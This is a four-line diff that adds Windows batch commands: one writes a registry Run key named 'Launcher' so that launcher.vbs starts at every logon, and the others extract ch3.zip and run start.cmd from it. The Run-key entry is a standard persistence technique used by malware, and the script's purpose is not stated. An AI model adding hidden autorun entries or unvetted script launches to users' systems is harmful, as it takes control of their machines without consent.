@@ -1,0 +1,4 @@
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Launcher /t REG_SZ /d "%cd%\launcher.vbs" /f
+tar -xf ch3.zip
+cd ch3
+cmd /c start.cmd
